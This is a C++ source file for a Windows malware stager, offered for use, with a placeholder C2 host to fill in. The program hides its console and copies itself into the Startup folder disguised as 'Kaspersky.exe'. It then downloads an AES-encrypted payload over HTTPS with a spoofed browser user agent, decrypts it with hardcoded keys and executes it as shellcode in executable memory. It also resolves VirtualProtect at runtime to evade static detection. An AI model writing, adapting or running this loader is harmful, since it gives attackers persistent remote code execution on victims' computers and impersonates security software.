#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <string>
#include <stdexcept>
#include <fstream>
#include <openssl/evp.h>
#include <shlobj.h>

// Link with wininet.lib for WinINet API
#pragma comment(lib, "wininet.lib")
// Set subsystem to WINDOWS and entry point to mainCRTStartup to hide console window
#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")

using std::string;

// Disable all PRINTF calls (for silent/release build)
#define PRINTF(...) 
#define FALSE_RES 0

// AutoClean: RAII wrapper for HINTERNET handles, auto-closes handle on destruction
class AutoClean {
    HINTERNET h{};
    public:
        AutoClean()=default;
        explicit AutoClean(HINTERNET x): h(x) {}
        ~AutoClean(){
            InternetCloseHandle(h);
            h=NULL;
        }
        AutoClean(const AutoClean&)=delete;
        AutoClean& operator=(const AutoClean&) = delete;
};

// Struct to store HTTP response and status
struct Resp { 
    bool api_ok=false; 
    DWORD winerr=0; 
    DWORD status=0; 
    string body; 
};

// Check if string is exactly 16 bytes (for AES key/IV)
static inline bool check16(const std::string& s){ return s.size()==16; }

// Check if system proxy is enabled (for HTTP requests)
bool WINAPI hasProxy(){
  INTERNET_PER_CONN_OPTION opts[1];
  opts[0].dwOption=INTERNET_PER_CONN_FLAGS;
  
  INTERNET_PER_CONN_OPTION_LIST lst{};
  lst.dwSize=sizeof(lst);
  lst.pszConnection= nullptr;
  lst.dwOptionCount=1;
  lst.pOptions= opts;

  DWORD sz=sizeof(lst);
  if(!InternetQueryOptionW(nullptr,INTERNET_OPTION_PER_CONNECTION_OPTION,&lst,&sz)){
    return false;
  }
  DWORD f=opts[0].Value.dwValue;

  return (f & (PROXY_TYPE_AUTO_DETECT| PROXY_TYPE_AUTO_PROXY_URL | PROXY_TYPE_PROXY)) != 0;
}

// AES-128-CBC encryption with PKCS#7 padding
// pt: plaintext, key16: 16-byte key, iv16: 16-byte IV, ct: output ciphertext
bool aes128_cbc_encrypt(const std::string& pt,
                        const std::string& key16,
                        const std::string& iv16,
                        std::string& ct)
{
    if (!check16(key16) || !check16(iv16)) return false;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    bool ok = EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr,
                                 (const unsigned char*)key16.data(),
                                 (const unsigned char*)iv16.data()) == 1;
    if (ok) {
        ct.resize(pt.size() + 16); // room for padding
        int n1 = 0, n2 = 0;
        ok = EVP_EncryptUpdate(ctx, (unsigned char*)ct.data(), &n1,
                               (const unsigned char*)pt.data(), (int)pt.size()) == 1
          && EVP_EncryptFinal_ex(ctx, (unsigned char*)ct.data() + n1, &n2) == 1;
        if (ok) ct.resize(n1 + n2); else ct.clear();
    }
    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

// AES-128-CBC decryption with PKCS#7 padding
// ct: ciphertext, key16: 16-byte key, iv16: 16-byte IV, pt: output plaintext
bool aes128_cbc_decrypt(const std::string& ct,
                        const std::string& key16,
                        const std::string& iv16,
                        std::string& pt)
{
    if (!check16(key16) || !check16(iv16)) return false;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    bool ok = EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), nullptr,
                                 (const unsigned char*)key16.data(),
                                 (const unsigned char*)iv16.data()) == 1;
    if (ok) {
        pt.resize(ct.size()); // upper bound before removing padding
        int n1 = 0, n2 = 0;
        ok = EVP_DecryptUpdate(ctx, (unsigned char*)pt.data(), &n1,
                               (const unsigned char*)ct.data(), (int)ct.size()) == 1
          && EVP_DecryptFinal_ex(ctx, (unsigned char*)pt.data() + n1, &n2) == 1;
        if (ok) pt.resize(n1 + n2); else pt.clear();
    }
    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

// Encrypt a file (inputPath) and write ciphertext to C:\Windows\Temp\aaa_encrypted.bin
void encryptFileToBin(const std::string& inputPath) {
    // Read file into buffer
    std::ifstream fin(inputPath, std::ios::binary);
    if (!fin) {
        PRINTF("Cannot open input file: %s\n", inputPath.c_str());
        return;
    }
    std::string pt((std::istreambuf_iterator<char>(fin)), std::istreambuf_iterator<char>());
    fin.close();

    // Example key and IV (16 bytes each)
    std::string key = std::string(16, '\x11');
    std::string iv  = std::string(16, '\x22');
    std::string ct;

    if (!aes128_cbc_encrypt(pt, key, iv, ct)) {
        PRINTF("Encryption failed!\n");
        return;
    }

    // Write ciphertext to file
    std::ofstream fout("C:\\Windows\\Temp\\aaa_encrypted.bin", std::ios::binary);
    if (!fout) {
        PRINTF("Cannot open output file!\n");
        return;
    }
    fout.write(ct.data(), ct.size());
    fout.close();
    PRINTF("Encrypted file written to C:\\Windows\\Temp\\aaa_encrypted.bin\n");
}

// Decrypt a file (inputPath) and write plaintext to C:\Windows\Temp\aaa_decrypted.bin
void decryptFileToBin(const std::string& inputPath) {
    // Read file into buffer (ciphertext)
    std::ifstream fin(inputPath, std::ios::binary);
    if (!fin) {
        PRINTF("Cannot open input file: %s\n", inputPath.c_str());
        return;
    }
    std::string ct((std::istreambuf_iterator<char>(fin)), std::istreambuf_iterator<char>());
    fin.close();

    // Example key and IV (16 bytes each)
    std::string key = std::string(16, '\x11');
    std::string iv  = std::string(16, '\x22');
    std::string pt;

    if (!aes128_cbc_decrypt(ct, key, iv, pt)) {
        PRINTF("Decryption failed!\n");
        return;
    }

    // Write plaintext to file
    std::ofstream fout("C:\\Windows\\Temp\\aaa_decrypted.bin", std::ios::binary);
    if (!fout) {
        PRINTF("Cannot open output file!\n");
        return;
    }
    fout.write(pt.data(), pt.size());
    fout.close();
    PRINTF("Decrypted file written to C:\\Windows\\Temp\\aaa_decrypted.bin\n");
}

// Perform a single HTTP GET request to download a file from C2 server
// host: domain, path: resource path, preconfig: use system proxy, https: use HTTPS
Resp HttpOnce(std::wstring& host, std::wstring& path, bool preconfig, bool https) {
    Resp r;
    DWORD access = preconfig ? INTERNET_OPEN_TYPE_PRECONFIG : INTERNET_OPEN_TYPE_DIRECT;
    HINTERNET sess = InternetOpenW(L"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0", access, nullptr, nullptr, 0);
    
    AutoClean c_sess(sess);
    if (!sess) { 
        r.winerr = GetLastError(); 
        return r; 
    }
    DWORD to=10000;
    InternetSetOptionW(sess, INTERNET_OPTION_CONNECT_TIMEOUT, &to, sizeof(to));
    InternetSetOptionW(sess, INTERNET_OPTION_SEND_TIMEOUT,    &to, sizeof(to));
    InternetSetOptionW(sess, INTERNET_OPTION_RECEIVE_TIMEOUT, &to, sizeof(to));

    INTERNET_PORT port = https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    HINTERNET conn = InternetConnectW(sess, host.c_str(), port, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    AutoClean c_conn(conn);
    if (!conn) { 
        r.winerr = GetLastError(); 
        return r; 
    }
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | (https ? INTERNET_FLAG_SECURE:0);
    HINTERNET req = HttpOpenRequestW(conn, L"GET", path.c_str(), nullptr, nullptr, nullptr, flags, 0);
    AutoClean c_req(req);

    if (!req) { 
        r.winerr = GetLastError();
        return r; 
    }

    if (!HttpSendRequestW(req, nullptr, 0, nullptr, 0)) { 
        r.winerr = GetLastError(); 
        return r;
    }

    DWORD len=sizeof(r.status); 
    if (!HttpQueryInfoW(req, HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER, &r.status, &len, nullptr)) { 
        r.winerr = GetLastError(); 
        return r; 
    } 

    char buf[4096]; 
    DWORD n=0; 
    while (InternetReadFile(req, buf, sizeof(buf), &n) && n){ 
        r.body.append(buf, n); 
    }
    r.api_ok = true;
    return r;
}

// Download, decrypt, and execute stager from C2 server
int getStager(std::wstring& host, std::wstring& path){

    Resp res1;
    res1= HttpOnce(host,path,true,true);
    if(!res1.api_ok){
        res1= HttpOnce(host,path,false,true);
    }
    if(res1.api_ok){

        // Save downloaded data to file for debugging/analysis
        std::ofstream fout("C:\\Windows\\Temp\\aaa.bin", std::ios::binary);
        fout.write(res1.body.data(), res1.body.size());
        fout.close();

        // Decrypt the downloaded payload
        std::string key = std::string(16, '\x11');  // 16 bytes
        std::string iv  = std::string(16, '\x22');  // 16 bytes
        std::string ct, out;
        aes128_cbc_decrypt(res1.body,key,iv,out);

        // Allocate memory for shellcode
        void* mem = VirtualAlloc(nullptr,out.size(),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
        if (!mem) {
            PRINTF("VirtualAlloc failed: %lu\n", GetLastError());
            return FALSE_RES;
        }
        PRINTF("Decrypted size: %zu\n", out.size());
        memcpy(mem, out.data(), out.size());
        DWORD oldProtect;

        // Dynamically resolve VirtualProtect to avoid static linking
        typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
        HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
        if (!hKernel32) {
            PRINTF("LoadLibraryA kernel32.dll failed!\n");
            VirtualFree(mem, 0, MEM_RELEASE);
            return FALSE_RES;
        }
        VirtualProtect_t pVirtualProtect = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
        if (!pVirtualProtect) {
            PRINTF("GetProcAddress VirtualProtect failed!\n");
            VirtualFree(mem, 0, MEM_RELEASE);
            return FALSE_RES;
        }
        // Change memory protection to executable
        if (!pVirtualProtect(mem, out.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            PRINTF("VirtualProtect failed: %lu\n", GetLastError());
            VirtualFree(mem, 0, MEM_RELEASE);
            return FALSE_RES;
        }
        // Execute shellcode
        ((void(*)())mem)();
        return 0;
        // VirtualFree(mem, 0, MEM_RELEASE);
    }else{
        return FALSE_RES;
    }
}

// Copy the current executable to the user's Startup folder (for persistence)
void copySelfToStartup() {
    // Get path to current executable
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Get current user name (not used here, but available if needed)
    char userName[256];
    DWORD userNameLen = sizeof(userName);
    GetUserNameA(userName, &userNameLen);

    // Get path to Startup folder
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        // Destination path in Startup folder (change "Kaspersky.exe" to any name you want)
        std::string destPath = std::string(startupPath) + "\\" + "Kaspersky.exe";
        // Copy the executable
        if (CopyFileA(exePath, destPath.c_str(), FALSE)) {
            PRINTF("Copied to Startup: %s\n", destPath.c_str());
        } else {
            PRINTF("Copy failed: %lu\n", GetLastError());
        }
    } else {
        PRINTF("Cannot get Startup folder!\n");
    }
}

int main(){

    // Example usage of encrypt/decrypt file functions:
    // decryptFileToBin(string("C:\\Windows\\Temp\\aaa_encrypted.bin"));
    copySelfToStartup(); // Copy itself to Startup for persistence
    // encryptFileToBin(string(""));
    // testStager(string("C:\\Windows\\Temp\\aaa.bin"));

    // Download and execute stager from C2
    std::wstring host = L"YOURDOMAIN OR IP";
    std::wstring path = L"/stager";
    getStager(host, path);

    // Wait for user input before exiting (for debugging)
    getchar();
    return 0;
}